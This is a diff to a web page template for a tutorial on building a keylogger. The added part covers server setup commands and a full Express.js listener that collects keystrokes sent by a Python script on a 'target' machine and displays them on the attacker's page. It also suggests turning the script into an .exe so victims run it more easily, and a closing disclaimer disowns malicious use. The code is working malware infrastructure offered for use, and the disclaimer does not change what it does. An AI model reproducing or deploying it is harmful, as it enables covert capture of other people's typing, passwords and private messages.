@@ -3,7 +3,7 @@
 {% block content %}
 <h1 id="typing-effect" class="display-2 mb-4"></h1>
 <br>
-<h3>Description</h3>
+<h2>Description</h2>
 
 <p class="solution-text no-indent">
     This is a simple keylogger project that combines JavaScript, Python and a remote server to track keyboard keys pressed on a computer. 
@@ -315,6 +315,192 @@
     And the script is done.
 </p>
 
-<h3>Writing the JavaScript code</h3>
+<h3>Setting up the Remote Server</h3>
+
+<p class="solution-text no-indent">
+For the purpose of this project, it is necessary to setup a remote server that our Python script will talk to. I recommend installing
+Ubuntu or Debian based OS, since it is easier to install all required softwares. Of course, it is also possible to use MacOS or a Windows
+server machine. We can install these softwares manually or with Python. Independently of how we choose to install the dependencies, these are the
+commands we need to run in the remote server terminal (for Linux):
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-plain">
+            sudo apt updated
+            sudo apt upgrade
+            sudo apt install nodejs
+            sudo apt install npm
+            sudo npm init -y
+            sudo npm install
+            sudo npm install prompt-sync
+            sudo reboot
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    In order to talk to our Python script, it is also necessary to write some code that interprets what our keylogger is sending
+    to the listening port. We installed these softwares to run the JavaScript code that will be responsible for that, as well as the 
+    Express web framework module.
+</p>
+
+<h2>JavaScript Listener</h2>
+
+<p class="solution-text no-indent">
+    Now we are ready to write our last script. We want to write a JavaScript code that will fetch the POST requests sent by our Python script malware.
+    This script, however, should be ran inside our remote server, differently from our Python script that runs inside the target machine. This piece
+    of code is only responsible to interpret and display in our server what the target is typing. We start by importing the libraries needed:
+</p>
+
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-javascript">
+            const fs = require("fs");
+            const express = require("express");
+            const prompt = require("prompt-sync")({ sigint: true });
+
+            const port = prompt("Enter listening port: ");
+            const app = express();
+
+            app.use(express.json({ extended: true }));
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    First three lines are just defining the libraries. In the port constant, we ask for the user to input the listening port of the server (this should be
+    the same port as we input in the Python script). The app constant creates an Express application instance, which will be used to handle HTTP requests.
+    The last line sets up middleware for the application, specifically for parsing JSON data that is sent in the request body. 
+    The extended option, when set to true, allows for more complex objects to be encoded as JSON. We now need to add two endpoints: a GET and POST endpoints.
+    Let's tart with the GET endpoint:
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-javascript">
+            const fs = require("fs");
+            const express = require("express");
+            const prompt = require("prompt-sync")({ sigint: true });
+
+            const port = prompt("Enter listening port: ");
+            const app = express();
+
+            app.use(express.json({ extended: true }));
+
+            app.get("/", (req, res) => {
+                try {
+                    const file = fs.readFileSync("./keyboard_log.txt", {encoding: 'utf8', flag: 'r' });
+                    res.send(`&lt;h1&gt;Logger&lt;/h1&gt;&lt;p&gt;${file.replace("\n", "&lt;br&gt;")}`);
+                } catch {
+                    res.send("&lt;h1&gt;Nothing logged&lt;/h1&gt;");
+                }
+            })
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    The GET endpoint retrieves the contents of a file named "keyboard_log.txt", and returns it to the client as an HTML 
+    page with a header and the contents of the file, separated by line breaks. 
+    If the file does not exist, it returns a message saying that there is nothing logged.
+</p>
+
+<p class="solution-text no-indent">
+    Now we write the POST endpoint:
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-javascript">
+            const fs = require("fs");
+            const express = require("express");
+            const prompt = require("prompt-sync")({ sigint: true });
+
+            const port = prompt("Enter listening port: ");
+            const app = express();
+
+            app.use(express.json({ extended: true }));
+
+            app.get("/", (req, res) => {
+                try {
+                    const file = fs.readFileSync("./keyboard_log.txt", {encoding: 'utf8', flag: 'r' });
+                    res.send(`&lt;h1&gt;Logger&lt;/h1&gt;&lt;p&gt;${file.replace("\n", "&lt;br&gt;")}`);
+                } catch {
+                    res.send("&lt;h1&gt;Nothing logged&lt;/h1&gt;");
+                }
+            });
+
+            app.post("/", (req, res) => {
+                console.log(req.body.keyboardData);
+                fs.writeFileSync("keyboard_log.txt", req.body.keyboardData);
+                res.send("[+] Data successfully set.");
+            });
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    The POST endpoint logs data from the client to the "keyboard_log.txt" file. The data is sent in the body of the request. Then, the server takes 
+    the data and writes it to the file. If the file does not exist, it creates the file and writes to it. Now we just need to set up a listener to our app:
+</p>
+
+<div class="shrink">
+    <pre>
+        <code id="text" class="hljs language-javascript">
+            const fs = require("fs");
+            const express = require("express");
+            const prompt = require("prompt-sync")({ sigint: true });
+
+            const port = prompt("Enter listening port: ");
+            const app = express();
+
+            app.use(express.json({ extended: true }));
+
+            app.get("/", (req, res) => {
+                try {
+                    const file = fs.readFileSync("./keyboard_log.txt", {encoding: 'utf8', flag: 'r' });
+                    res.send(`&lt;h1&gt;Logger&lt;/h1&gt;&lt;p&gt;${file.replace("\n", "&lt;br&gt;")}`);
+                } catch {
+                    res.send("&lt;h1&gt;Nothing logged&lt;/h1&gt;");
+                }
+            });
+
+            app.post("/", (req, res) => {
+                console.log(req.body.keyboardData);
+                fs.writeFileSync("keyboard_log.txt", req.body.keyboardData);
+                res.send("[+] Data successfully set.");
+            });
+
+            app.listen(port, () => {
+                console.log(`[-] Listening on port ${port}`);
+            });
+        </code>
+    </pre>
+</div>
+
+<p class="solution-text no-indent">
+    When we run this code, the app starts listening on the port number specified by the user.
+</p>
+
+<h3>Final considerations</h3>
+
+<p class="solution-text no-indent">
+    This is a simple keylogger project that needs more sharpening. It is a front-door to a much robust keylogger and it is only
+    meant to illustrate how to build a connection between a target and a remote server using Python and JavaScript. These two endpoints
+    talk to each other by sending HTTP requests. All the pressed keys in the target pc is logged into the remote server root page in HTML format,
+    synchronously. What is being typed by the target is going to show on the attacker screen as long as the target is online and the Python script
+    is running. The first drawback of this code is that the target needs to have Python installed, as well as all the packages used in the script. 
+    Another drawback is that the target needs to run the script in order to be vulnerable to it. There are a few ways to bypass this, one of each
+    is by making the .py file to be an executable file .exe (if target uses a Windows machine). However, the target still needs to have Python installed.
+    
+</p>
+
+<h2>Disclaimer</h2>
+WARNING! This project must not be used for malicious purposes. It is simply a project to show how keyloggers work in remote servers. Use at your own risk.
+
+
+
 
 {% endblock %}
